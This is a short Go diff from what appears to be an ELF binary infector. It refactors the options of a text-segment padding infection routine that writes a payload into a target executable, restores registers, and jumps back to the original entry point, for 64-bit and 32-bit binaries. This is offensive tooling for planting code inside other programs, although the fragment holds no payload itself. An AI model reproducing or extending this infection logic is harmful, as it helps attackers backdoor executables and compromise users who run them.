@@ -24,7 +24,7 @@ const (
 	EXTEND_SECTION_HEADER_ENTRY     string = "[+] Extending section header entry for text section by payload len."
 )
 
-func (t *TargetBin) TextSegmentPaddingInfection(debug bool, noRestoration bool, noRetOEP bool) error {
+func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) error {
 	var textSegEnd interface{}
 	var oShoff interface{}
 	var textNdx int
@@ -53,11 +53,11 @@ func (t *TargetBin) TextSegmentPaddingInfection(debug bool, noRestoration bool, 
 					fmt.Printf(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
 				}
 
-				if noRestoration == false {
+				if !((opts & NoRest) == NoRest)  {
 					t.Payload.Write(restoration64)
 				}
 
-				if noRetOEP == false {
+				if !((opts & NoRetOEP) == NoRetOEP) {
 					retStub := modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header64).Entry, oEntry)
 					t.Payload.Write(retStub)
 				}
@@ -133,11 +133,11 @@ func (t *TargetBin) TextSegmentPaddingInfection(debug bool, noRestoration bool, 
 					fmt.Printf(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
 				}
 
-				if noRestoration == false {
+				if !((opts & NoRest) == NoRest) {
 					t.Payload.Write(restoration32)
 				}
 
-				if noRetOEP == false {
+				if !((opts & NoRetOEP) == NoRetOEP) {
 					retStub := modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header32).Entry, oEntry)
 					t.Payload.Write(retStub)
 				}
